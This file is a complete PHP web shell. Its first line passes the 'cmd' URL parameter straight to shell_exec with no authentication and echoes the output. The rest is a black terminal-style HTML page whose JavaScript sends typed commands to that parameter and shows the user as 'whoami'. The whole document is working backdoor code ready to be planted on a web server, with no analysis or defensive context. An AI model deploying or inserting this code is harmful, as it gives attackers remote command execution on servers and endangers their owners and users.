<?php if (ISSET($_GET['cmd'])) { echo shell_exec($_GET['cmd']." 2>&1"); die(); } ?>

<html>
    <head>
        <title></title>
        <style>
            body {
                width: 100%;
                height: 100%;
                margin: 0;
                background: #000;
            }
            
            body, .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 14px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
                overflow: hidden;
            }
        
            .console {
                width: 100%;
                height: 100%;
                margin: auto;
                position: absolute;
                color: #fff;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 0;
                line-height: 20px;
            }
            
            .input, .input form, .inputtext {
                width: 100%;
                height: 30px;
                position: absolute;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
            }
            
            .input form, .inputtext {
                width: 100%;
                display: inline-block;
            }
            
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                display: inline-block;
                line-height: 30px;
            }

            .input {
                border-top: 1px solid #333333;
            }
            
            .inputtext {
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }

            ::-webkit-scrollbar {
                width: 12px;
            }

            ::-webkit-scrollbar-track {
                background: #101010;
            }

            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
        </style>
    </head>
    <body>
        <div class="console">
            <div class="output" id="output"></div>
            <div class="input">
                <div class="username" id="username"></div>
                <form id="form" method="GET" onSubmit="sendCommand()">
                    <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                </form>
            </div>
        </div>
        <script type="text/javascript">
            var username = "";
            getUsername();
            
            function getUsername() {
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        username = request.responseText.replace(/(?:\r\n|\r|\n)/g, "");
                        document.getElementById("username").innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"</div>#";
                    }
                };

                request.open("GET", "?cmd="+encodeURI("whoami"), true);
                request.send();
            }
            
            function sendCommand() {
                var request = new XMLHttpRequest();
                var command = document.getElementById('inputtext').value;
                var outputElement = document.getElementById("output");
                
                document.getElementById('inputtext').value = "";

                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"</div><div style='float: left;'>"+"# "+command+"</div><br>" + request.responseText.replace(/(?:\r\n|\r|\n)/g, "<br>");
                        outputElement.scrollTop = outputElement.scrollHeight;
                    }
                };

                request.open("GET", "?cmd="+encodeURI(command), true);
                request.send();
                return false;
            }
            
            document.getElementById("form").addEventListener("submit", function(event){
                event.preventDefault()
            });
        </script>
    </body>
</html>